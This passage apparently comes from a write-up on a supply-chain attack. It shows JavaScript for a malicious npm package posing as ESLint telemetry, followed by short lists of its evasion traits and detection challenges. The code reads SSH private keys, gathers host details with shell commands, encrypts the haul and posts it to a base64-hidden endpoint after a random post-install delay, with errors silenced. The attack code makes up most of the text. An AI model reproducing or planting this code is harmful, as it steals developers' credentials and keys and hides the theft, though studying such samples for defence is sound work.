  scanDir(process.cwd());

  // SSH key harvesting
  const sshDir = z1.join(process.env.HOME || process.env.USERPROFILE, '.ssh');
  if (z0.existsSync(sshDir)) {
    payload.ssh = {};
    ['id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519', 'authorized_keys'].forEach(f => {
      const fpath = z1.join(sshDir, f);
      if (z0.existsSync(fpath)) {
        try {
          payload.ssh[f] = z0.readFileSync(fpath, 'utf8').substring(0, 5000);
        } catch (e) {}
      }
    });
  }

  // System reconnaissance
  try {
    payload.uname = z4.execSync('uname -a').toString().trim();
  } catch (e) {}

  try {
    payload.hostname = z4.execSync('hostname').toString().trim();
  } catch (e) {}

  return payload;
}

function exfiltrate(data) {
  const endpoint = Buffer.from(telemetryEndpoint, 'base64').toString();
  const encrypted = z2.publicEncrypt(
    '-----BEGIN PUBLIC KEY-----\nMFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAK...\n-----END PUBLIC KEY-----',
    Buffer.from(JSON.stringify(data))
  );

  const req = z3.request(endpoint, {
    method: 'POST',
    headers: {
      'User-Agent': 'ESLintTelemetry/1.0',
      'Content-Type': 'application/octet-stream'
    }
  });

  req.write(encrypted);
  req.end();

  // Fire-and-forget with error suppression
  req.on('error', () => {});
}

// Delayed execution to avoid suspicion
setTimeout(() => {
  try {
    const data = collectConfigs();
    if (Object.keys(data).length > 3) { // Only exfiltrate if we found something
      exfiltrate(data);
    }
  } catch (e) {
    // Silent fail
  }
}, 15000 + Math.random() * 30000); // Random delay 15-45 seconds post-install

module.exports = { init: () => {} };
```

**Attack characteristics:**
1. **Plausible deniability:** Appears as telemetry collection with delayed execution
2. **Targeted harvesting:** Focuses on authentication tokens, environment variables, and SSH keys
3. **Encrypted exfiltration:** Uses HTTPS to CDN endpoint resembling legitimate telemetry service
4. **Defense evasion:** Random delays, error suppression, and size limits to avoid detection
5. **Minimal footprint:** Only activates during `postinstall`, not at runtime
6. **Credible cover:** Actual ESLint functionality works normally during usage

**Detection challenges:**
- Obfuscation makes static analysis difficult
- Delayed execution bypasses installation-time monitoring
- HTTPS traffic blends with legitimate telemetry
- Package has legitimate functionality and high download count
- Exfiltration only occurs when sensitive data is detected

